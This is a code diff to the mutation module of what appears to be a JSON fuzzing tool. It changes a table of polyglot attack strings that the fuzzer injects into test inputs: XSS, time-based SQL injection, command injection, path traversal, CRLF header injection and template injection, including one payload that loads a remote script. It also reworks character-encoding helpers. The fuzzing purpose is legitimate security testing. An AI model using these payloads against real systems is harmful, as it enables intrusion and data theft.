@@ -96,8 +96,8 @@ class PJFMutators(object):
         }
 
         self.polyglot_attacks = {
-            0: "jaVasCript:/*-/*\\u0060/*\\\\u0060/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</tit"
-               "Le/</teXtarEa/</scRipt/--!>\\u003csVg/<sVg/oNloAd=alert(\%s\)//>\\u003e",
+            0: "jaVasCript:/*-/*\x60/*\\x60/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</tit"
+               "Le/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(\%s\)//>\x3e",
             1: "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR"
                "(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)"
                "<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = %s",
@@ -105,11 +105,11 @@ class PJFMutators(object):
             3: "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/%s",
             4: "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),"
                "s.stack=Error().stack,s.src=(/,/+/%s.net/).slice(2),document.documentElement.appendChild(s))//'>",
-            5: "%s&sleep 5&id'\\\"\\u00600&sleep 5&id\\u0060'",
+            5: "%s&sleep 5&id'\\\"\x600&sleep 5&id\x60'",
             6: "..\\..\\..\\..\\%s.ini",
             7: "data:text/html,https://%s:a.it@www.\\it",
             8: "file:///proc/self/%s",
-            9: "\\u000d\\u00a0BB: %s@mail.it\\u000d\\u000aLocation: www.google.it",
+            9: "\x0d\x0aCC: %s@mail.it\x0d\x0aLocation: www.google.it",
             10: "||cmd.exe&&id||%s",
             11: "${7*7}a{{%s}}b",
             12: "{{'%s'*7}}",
@@ -136,14 +136,20 @@ class PJFMutators(object):
         return self.polyglot_attacks[random.choice(self.config.techniques)] % obj
 
     def fuzz(self, obj):
+        """
+        Perform the fuzzing
+        """
         buf = list(obj)
         FuzzFactor = (float(len(buf))*float(random.randint(1, 100))) / 100.0
         numwrites=random.randrange(math.ceil((float(len(buf)) / FuzzFactor)))+1
         for j in range(numwrites):
             self.random_action(buf)
-        return self.safe_join(buf)
+        return self.safe_unicode(buf)
 
     def random_action(self, b):
+        """
+        Perform the actual fuzzing using random strategies
+        """
         action = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9, 10])
         if len(b) >= 3:
             pos = random.randint(0, len(b)-2)
@@ -230,17 +236,23 @@ class PJFMutators(object):
                     b[:] = list(new)
 
     def safe_join(self, buf):
+        """
+        Safely join a list of character
+        """
         tmp_buf = ""
-        if not self.config.utf8:
-            for character in buf:
-                if character in string.printable:
-                    tmp_buf += character
-                else:
-                    tmp_buf += "\\u%04x" % ord(character)
-        else:
-            for character in buf:
-                if character in string.printable:
-                    tmp_buf += character
-                else:
-                    tmp_buf += "\\%02x" % ord(character)
+        for character in buf:
+            tmp_buf += character
         return tmp_buf
+
+    def safe_unicode(self, buf):
+        """
+        Safely return an unicode encoded string
+        """
+        tmp = ""
+        buf = "".join(b for b in buf)
+        for character in buf:
+            if character not in string.printable:
+                tmp += "\u%04x" % ord(character)
+            else:
+                tmp += character
+        return tmp
